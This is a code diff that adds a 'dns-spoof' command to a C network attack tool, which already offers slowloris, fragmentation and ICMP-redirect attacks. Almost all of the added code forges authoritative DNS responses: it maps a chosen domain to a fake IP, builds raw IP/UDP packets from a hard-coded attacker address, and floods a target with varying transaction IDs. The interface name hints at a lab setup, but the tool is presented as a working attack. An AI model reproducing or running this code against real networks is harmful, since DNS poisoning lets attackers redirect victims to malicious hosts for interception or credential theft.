@@ -18,6 +18,7 @@ static void usage(void) {
     fprintf(stderr, "  slowloris  --target <ip> --port <port> [--conns <n>] [--iface <name>]\n");
     fprintf(stderr, "  frag-attack --target <ip> [--overlap] [--tiny] [--iface <name>] [--count <n>]\n");
     fprintf(stderr, "  icmp-redirect --target <ip> --new-gw <ip> --orig-dst <ip> [--count <n>] [--iface <name>]\n");
+    fprintf(stderr, "  dns-spoof  --domain <name> --fake-ip <ip> --target <ip> [--count <n>] [--iface <name>]\n");
     fprintf(stderr, "\nAll commands require sudo (raw socket access).\n");
 }
 
@@ -496,6 +497,125 @@ static int cmd_icmp_redirect(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_dns_spoof(int argc, char **argv) {
+    const char *domain = NULL, *fake_ip_str = NULL, *target_str = NULL;
+    const char *iface = "iron0";
+    int count = 10;
+
+    for (int i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "--domain") == 0 && i + 1 < argc) domain = argv[++i];
+        else if (strcmp(argv[i], "--fake-ip") == 0 && i + 1 < argc) fake_ip_str = argv[++i];
+        else if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
+        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
+    }
+
+    if (!domain || !fake_ip_str || !target_str) {
+        fprintf(stderr, "Error: --domain, --fake-ip, and --target required\n"); return 1;
+    }
+
+    uint32_t fake_ip = parse_ip(fake_ip_str);
+    uint32_t target_ip = parse_ip(target_str);
+    if (!fake_ip || !target_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }
+
+    int fd = tap_open(iface);
+    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }
+
+    printf("=== DNS Spoof Attack ===\n");
+    printf("  Domain:  %s\n", domain);
+    printf("  Fake IP: %s\n", fake_ip_str);
+    printf("  Target:  %s\n", target_str);
+    printf("  Count:   %d\n\n", count);
+
+    /* Build forged DNS response */
+    /* DNS response: header(12) + question + answer */
+    uint8_t dns_resp[128];
+    int dns_len = 0;
+
+    /* DNS header */
+    dns_resp[0] = 0x00; dns_resp[1] = 0x01; /* Transaction ID */
+    dns_resp[2] = 0x81; dns_resp[3] = 0x80; /* Flags: response, authoritative */
+    dns_resp[4] = 0x00; dns_resp[5] = 0x01; /* Questions: 1 */
+    dns_resp[6] = 0x00; dns_resp[7] = 0x01; /* Answers: 1 */
+    dns_resp[8] = 0x00; dns_resp[9] = 0x00; /* Authority: 0 */
+    dns_resp[10] = 0x00; dns_resp[11] = 0x00; /* Additional: 0 */
+    dns_len = 12;
+
+    /* Question: encode domain name */
+    const char *p = domain;
+    while (*p) {
+        const char *dot = strchr(p, '.');
+        int label_len = dot ? (int)(dot - p) : (int)strlen(p);
+        dns_resp[dns_len++] = (uint8_t)label_len;
+        memcpy(dns_resp + dns_len, p, label_len);
+        dns_len += label_len;
+        p += label_len + (dot ? 1 : 0);
+        if (!dot) break;
+    }
+    dns_resp[dns_len++] = 0; /* End of name */
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Type A */
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Class IN */
+
+    /* Answer: pointer to name + Type A + Class IN + TTL + IP */
+    dns_resp[dns_len++] = 0xC0; dns_resp[dns_len++] = 0x0C; /* Name pointer to offset 12 */
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Type A */
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Class IN */
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x00;
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x3C; /* TTL: 60s */
+    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x04; /* Data length: 4 */
+    memcpy(dns_resp + dns_len, &fake_ip, 4); /* The fake IP */
+    dns_len += 4;
+
+    /* Wrap in UDP + IP and send */
+    /* Build: IP(20) + UDP(8) + DNS payload */
+    uint8_t pkt[256];
+    memset(pkt, 0, sizeof(pkt));
+    int ip_total = 20 + 8 + dns_len;
+
+    /* IP header */
+    pkt[0] = 0x45;
+    pkt[2] = (ip_total >> 8) & 0xFF; pkt[3] = ip_total & 0xFF;
+    pkt[8] = 64; pkt[9] = 17; /* UDP */
+    uint32_t src_ip = htonl(0xC0A80A01); /* 192.168.10.1 (attacker) */
+    memcpy(pkt + 12, &src_ip, 4);
+    memcpy(pkt + 16, &target_ip, 4);
+    /* IP checksum */
+    uint32_t sum = 0;
+    for (int i = 0; i < 20; i += 2) sum += (pkt[i] << 8) | pkt[i+1];
+    while (sum >> 16) sum = (sum >> 16) + (sum & 0xFFFF);
+    uint16_t ck = ~sum & 0xFFFF;
+    pkt[10] = (ck >> 8) & 0xFF; pkt[11] = ck & 0xFF;
+
+    /* UDP header */
+    uint8_t *udp = pkt + 20;
+    udp[0] = 0x00; udp[1] = 0x35; /* src port 53 */
+    udp[2] = 0x00; udp[3] = 0x35; /* dst port 53 */
+    uint16_t udp_len = 8 + dns_len;
+    udp[4] = (udp_len >> 8) & 0xFF; udp[5] = udp_len & 0xFF;
+    /* UDP checksum = 0 (optional for IPv4) */
+    memcpy(udp + 8, dns_resp, dns_len);
+
+    int sent = 0;
+    for (int i = 0; i < count; i++) {
+        /* Vary transaction ID */
+        udp[8] = (i >> 8) & 0xFF; udp[9] = i & 0xFF;
+
+        struct sockaddr_in dst;
+        memset(&dst, 0, sizeof(dst));
+        dst.sin_family = AF_INET;
+        dst.sin_addr.s_addr = target_ip;
+
+        int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&dst, sizeof(dst));
+        if (rc > 0) sent++;
+        usleep(100000);
+    }
+
+    printf("  Sent: %d forged DNS responses\n", sent);
+    printf("  Payload: %s -> %s (TTL=60s)\n\n", domain, fake_ip_str);
+    close(fd);
+    return 0;
+}
+
 int main(int argc, char **argv) {
     if (argc < 2) {
         usage();
@@ -520,6 +640,8 @@ int main(int argc, char **argv) {
         return cmd_frag_attack(argc - 2, argv + 2);
     } else if (strcmp(cmd, "icmp-redirect") == 0) {
         return cmd_icmp_redirect(argc - 2, argv + 2);
+    } else if (strcmp(cmd, "dns-spoof") == 0) {
+        return cmd_dns_spoof(argc - 2, argv + 2);
     } else if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
         usage();
         return 0;
